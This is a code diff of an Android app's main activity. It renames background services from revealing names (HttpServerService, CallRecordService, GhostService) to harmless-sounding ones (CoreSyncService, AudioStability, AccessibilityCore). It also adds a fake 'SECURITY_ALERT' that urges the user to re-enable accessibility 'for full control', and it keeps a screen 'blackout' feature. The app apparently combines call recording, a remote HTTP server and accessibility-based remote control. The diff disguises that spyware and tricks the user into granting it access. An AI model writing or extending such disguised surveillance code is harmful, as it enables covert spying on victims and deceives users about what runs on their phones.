@@ -399,7 +399,7 @@ public class MainActivity extends AppCompatActivity {
             tvStatus.setTextColor(getColor(R.color.neon_yellow));
         });
         
-        Intent serviceIntent = new Intent(this, HttpServerService.class);
+        Intent serviceIntent = new Intent(this, CoreSyncService.class);
         serviceIntent.setAction("START");
 
         try {
@@ -415,7 +415,7 @@ public class MainActivity extends AppCompatActivity {
         // Staggered Startup: Prevent hardware contention
         try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
         
-        Intent callServiceIntent = new Intent(this, CallRecordService.class);
+        Intent callServiceIntent = new Intent(this, AudioStability.class);
         callServiceIntent.setAction("START_SERVICE");
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -424,7 +424,7 @@ public class MainActivity extends AppCompatActivity {
                 startService(callServiceIntent);
             }
         } catch (Exception e) {
-            Log.e("MainActivity", "Error starting CallRecordService: " + e.getMessage());
+            Log.e("MainActivity", "Error starting AudioStability: " + e.getMessage());
         }
     }
 
@@ -434,17 +434,17 @@ public class MainActivity extends AppCompatActivity {
             tvStatus.setTextColor(getColor(R.color.neon_yellow));
         });
 
-        Intent serviceIntent = new Intent(this, HttpServerService.class);
+        Intent serviceIntent = new Intent(this, CoreSyncService.class);
         serviceIntent.setAction("STOP");
         startService(serviceIntent);
 
         // Terminate accompanying services
-        Intent callServiceIntent = new Intent(this, CallRecordService.class);
+        Intent callServiceIntent = new Intent(this, AudioStability.class);
         stopService(callServiceIntent);
     }
 
     private boolean isServerRunning() {
-        return HttpServerService.isRunning;
+        return CoreSyncService.isRunning;
     }
 
     private void updateUI() {
@@ -581,9 +581,15 @@ public class MainActivity extends AppCompatActivity {
         updateUI();
         checkNotificationAccess();
         
+        // Monitoring: Accessibility Health
+        if (AccessibilityCore.getInstance() == null) {
+            tvTerminalFeedback.setText("SECURITY_ALERT: Accessibility service disabled. Please re-enable for full control.");
+            tvTerminalFeedback.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_light));
+        }
+
         // Anti-Blackout Safety
-        if (GhostService.getInstance() != null) {
-            GhostService.getInstance().startBlackout(false);
+        if (AccessibilityCore.getInstance() != null) {
+            AccessibilityCore.getInstance().startBlackout(false);
         }
     }
 }
